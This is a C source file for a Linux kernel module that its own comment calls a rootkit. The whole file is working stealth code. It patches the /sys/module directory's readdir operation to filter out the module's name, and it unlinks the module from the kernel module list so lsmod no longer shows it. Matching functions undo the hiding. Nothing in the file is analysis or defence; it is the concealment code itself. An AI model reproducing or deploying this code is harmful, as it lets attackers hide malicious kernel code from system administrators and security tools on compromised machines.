#include<linux/module.h>
#include<linux/list.h>
#include<linux/kthread.h>
#include<linux/sysfs.h>
#include<linux/fs.h>
#include<linux/moduleparam.h>
#include<linux/kobject.h>
#include<linux/types.h>
#include<linux/namei.h>

static int is_hidden = 0; //this is set to 1 if hidden

static struct list_head * tmp_head;

struct inode * sys_inode;
static struct file_operations my_fops;
const static struct file_operations *original_fops = 0;
filldir_t sys_fill_dir;

struct inode * get_sys_inode(void);
static int readdir_sys (struct file*, void*, filldir_t);
static void hide_sys_tree(void);
static int my_filldir_t (void *, const char *, int, loff_t, u64, unsigned);

struct inode * get_sys_inode(void)
{
	struct path sys_path;
	if(kern_path("/sys/module", 0, &sys_path))
		return NULL;
	
	return sys_path.dentry->d_inode;
}

static int readdir_sys( struct file* f, void * a, filldir_t t){
	sys_fill_dir = t;
	
	return original_fops->readdir(f, a, my_filldir_t);
}

static int my_filldir_t (void * __buf, const char * name, int namelen, loff_t offset, u64 ino, unsigned d_type){
	//if the dir belongs to our rootkit, don't list it
	if(strcmp(name, THIS_MODULE->mkobj.kobj.name) == 0){
		return 0;
	}
	return sys_fill_dir(__buf,name,namelen,offset,ino,d_type);
}


//Enable hiding
static void hide_sys_tree(){
	if(is_hidden == 0){
		sys_inode = get_sys_inode();
		if(sys_inode == NULL){
			printk(KERN_INFO "Couldn't obtain sys inode\n");
		}
		else{
			//hide from /sys/module/
			original_fops = sys_inode->i_fop;
			my_fops = *sys_inode->i_fop;
			my_fops.readdir = readdir_sys;
			sys_inode->i_fop = &my_fops;
			
			//hide from lsmod 
			tmp_head = THIS_MODULE->list.prev;
			list_del(&THIS_MODULE->list);		
	
			is_hidden = 1;
		}
	}
}

void hide_code(void){
	hide_sys_tree();
}

//Disable hiding
void make_module_removable(void){
	if(is_hidden == 1){
		sys_inode->i_fop = original_fops;
		list_add(&THIS_MODULE->list, tmp_head);
		is_hidden = 0;
	}
}

void unhide_code(void) {
	make_module_removable();
}

